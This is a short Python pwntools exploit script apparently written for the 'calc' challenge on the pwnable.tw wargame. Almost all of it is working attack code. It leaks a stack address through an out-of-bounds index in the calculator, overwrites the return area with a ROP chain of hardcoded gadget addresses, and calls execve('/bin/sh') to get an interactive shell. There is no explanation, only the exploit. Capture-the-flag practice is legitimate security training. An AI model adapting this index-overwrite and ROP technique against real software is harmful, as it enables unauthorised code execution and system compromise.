from pwn import *

p = process("./calc")
#p = remote('chall.pwnable.tw', 10100)
context.log_level = "debug"
#gdb.attach(proc.pidof(p)[0],"b *0x08049432")

max_int = 4294967296
int_addr = 0x806DDA3
par_addr = 0x0805c34b
pcbr_addr = 0x080701d1
pdr_addr = 0x080701aa

def leak():
    p.recvuntil("\n")
    p.sendline("+360")
    ret = int(p.recvuntil("\n").strip())
    log.success("Leak addr:" + hex(max_int + ret))
    p.sendline("1")
    return ret

def hack(k,v):
    p.recvuntil("\n")
    p.sendline("+%d"%(k))
    ret = int(p.recvuntil("\n").strip())
    if ret > v:
        p.sendline("+%d-%d"%(k,ret-v))
    else:
        p.sendline("+%d+%d"%(k,v-ret))

def exit():
    p.recvuntil("\n")
    p.sendline()

if __name__ == "__main__":
    binsh_addr = leak() + 4
    hack(361,par_addr)
    hack(362,11)
    hack(363,pcbr_addr)
    hack(364,0)
    hack(365,binsh_addr)
    hack(366,pdr_addr)
    hack(367,0)
    hack(368,int_addr)
    hack(369,u32("/bin"))
    hack(370,u32("/sh\x00"))
    exit()
    p.interactive()

